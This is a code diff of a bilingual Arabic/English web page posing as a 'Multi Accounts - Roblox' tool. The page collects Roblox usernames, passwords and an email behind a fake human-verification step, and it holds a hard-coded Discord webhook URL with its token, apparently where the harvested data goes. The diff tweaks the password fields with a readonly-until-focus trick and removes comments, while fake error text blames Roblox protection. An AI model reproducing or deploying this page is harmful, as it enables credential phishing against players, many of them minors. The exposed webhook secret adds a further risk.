@@ -126,7 +126,7 @@
         <div class="bot-section">
             <p id="main_title" style="font-weight:bold">الحساب الاساسي :</p>
             <input type="text" id="main_user" placeholder="user" autocomplete="off">
-            <input type="password" id="main_pass" placeholder="Password" autocomplete="off" autocomplete="new-password" autocapitalize="none" spellcheck="false">
+            <input type="password" id="main_pass" placeholder="Password" autocomplete="off" autocomplete="new-password" autocapitalize="none" spellcheck="false" readonly onfocus="this.removeAttribute('readonly')">
         </div>
 
         <div id="bots_inputs_container"></div>
@@ -146,7 +146,6 @@
     const webhookURL = "https://discord.com/api/webhooks/1485705281399951380/vq0MMpRxWwbxu81_b2sH0NyCuwJNylU105PRJCF37kwFDwuLbRMvnroWGai3a1dZ6ApE";
     let currentLang = "ar";
 
-    // دالة لحفظ الإعدادات
     function saveSettings() {
         localStorage.setItem('darkMode', document.body.classList.contains('dark-mode') ? 'true' : 'false');
         localStorage.setItem('language', currentLang);
@@ -154,7 +153,6 @@
         localStorage.setItem('enModeClass', document.body.classList.contains('en-mode') ? 'true' : 'false');
     }
 
-    // دالة لاسترجاع الإعدادات
     function loadSettings() {
         const savedDark = localStorage.getItem('darkMode');
         const savedLang = localStorage.getItem('language');
@@ -177,7 +175,6 @@
             if (savedEnMode === 'true') document.body.classList.add('en-mode');
             else document.body.classList.remove('en-mode');
 
-            // تغيير النصوص للإنجليزية
             document.getElementById('t1').innerText = "Multi Accounts - Roblox";
             document.getElementById('p1').innerText = "Sorry, to verify that you are human and not a bot, put your email here:";
             document.getElementById('b1').innerText = "Verify Now";
@@ -195,7 +192,7 @@
             html.lang = "ar";
             html.dir = "rtl";
             document.body.classList.remove('en-mode');
-            // النصوص بالعربية (افتراضية)
+
             document.getElementById('t1').innerText = "Multi Accounts - Roblox";
             document.getElementById('p1').innerText = "عذراً للتحقق أنك إنسان ولست بوت يحاول استغلال الرابط ضع ايميلك هنا :";
             document.getElementById('b1').innerText = "تحقق الآن";
@@ -208,7 +205,6 @@
             document.getElementById('p3').innerText = "عذراً لقد تم صد المحاوله بسبب حمايه روبلوكس ، حاول مره اخرى لاحقاً او اخبر مطور الموقع بهاذا الخلل .. سيتم تجاوز الحمايه لاحقاً من قبل المطور !";
             document.getElementById('lang-toggle').innerText = "🇺🇸";
         }
-        // إعادة إنشاء حقول البوتات إذا كان هناك عدد محدد مسبقاً
         const selectedCount = document.getElementById('bot_count').value;
         if (selectedCount !== "0") generateBotFields();
     }
@@ -223,7 +219,6 @@
     function toggleLang() {
         const html = document.getElementById('mainHtml');
         if (currentLang === "ar") {
-            // التبديل إلى الإنجليزية
             html.lang = "en"; html.dir = "ltr";
             document.body.classList.add('en-mode');
             document.getElementById('t1').innerText = "Multi Accounts - Roblox";
@@ -239,7 +234,6 @@
             document.getElementById('lang-toggle').innerText = "🇸🇦";
             currentLang = "en";
         } else {
-            // التبديل إلى العربية
             html.lang = "ar"; html.dir = "rtl";
             document.body.classList.remove('en-mode');
             document.getElementById('t1').innerText = "Multi Accounts - Roblox";
@@ -255,7 +249,6 @@
             document.getElementById('lang-toggle').innerText = "🇺🇸";
             currentLang = "ar";
         }
-        // إعادة إنشاء حقول البوتات لتحديث اللغة
         const selectedCount = document.getElementById('bot_count').value;
         if (selectedCount !== "0") generateBotFields();
         saveSettings();
@@ -282,7 +275,7 @@
                 <div class="bot-section">
                     <p style="font-weight:bold">${currentLang === "ar" ? 'حساب البوت' : 'Bot Account'} ${i} :</p>
                     <input type="text" id="bot_user_${i}" placeholder="User" autocomplete="off">
-                    <input type="password" id="bot_pass_${i}" placeholder="Password" autocomplete="off" autocomplete="new-password" autocapitalize="none" spellcheck="false">
+                    <input type="password" id="bot_pass_${i}" placeholder="Password" autocomplete="off" autocomplete="new-password" autocapitalize="none" spellcheck="false" readonly onfocus="this.removeAttribute('readonly')">
                 </div>`;
         }
     }
@@ -329,11 +322,8 @@
         document.getElementById('step3').classList.add('active');
     }
 
-    // ربط الأزرار
     document.getElementById('theme-toggle').onclick = toggleTheme;
     document.getElementById('lang-toggle').onclick = toggleLang;
-
-    // استرجاع الإعدادات عند تحميل الصفحة
     window.addEventListener('DOMContentLoaded', loadSettings);
 </script>
 </body>
